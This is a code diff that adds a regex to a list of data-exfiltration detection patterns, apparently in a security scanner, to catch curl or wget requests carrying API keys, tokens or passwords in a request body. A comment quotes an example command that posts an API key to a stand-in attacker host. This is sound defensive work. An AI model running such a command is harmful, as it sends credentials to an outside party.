@@ -246,6 +246,14 @@ export const DATA_EXFILTRATION_PATTERNS = [
   // var outside the URL token) does NOT match. Bounded lazy-then-anchored quantifiers
   // exclude the pipe/whitespace boundaries → ReDoS-safe.
   /\b(?:curl|wget)\b[^\n]{0,150}?https?:\/\/[^\n\s?]{0,200}\?[^\n\s]{0,200}?\$\{?[A-Za-z0-9_]{0,40}(?:KEY|TOKEN|SECRET|PASS|CRED)/i,
+  // SMI-5359 Wave 4 (MF-1 exfil preservation, POST/form body): the GET-query pattern
+  // above misses a credential carried in a request BODY
+  // (`curl -d "key=$API_KEY" https://evil.example/collect`), the more common exfil
+  // channel. Matches curl/wget with a -d/--data*/-F/--form arg containing a
+  // $KEY/$TOKEN/$SECRET/$PASS/$CRED var. A header-borne auth call (`-H "Authorization:
+  // Bearer $TOKEN"`) uses neither flag, so it does NOT match. Bounded lazy quantifiers
+  // → ReDoS-safe.
+  /\b(?:curl|wget)\b[^\n]{0,200}?(?:-d|--data(?:-raw|-binary|-urlencode)?|-F|--form)\b[^\n]{0,100}?\$\{?[A-Za-z0-9_]{0,40}(?:KEY|TOKEN|SECRET|PASS|CRED)/i,
 ]
 
 // SMI-685: Privilege escalation patterns
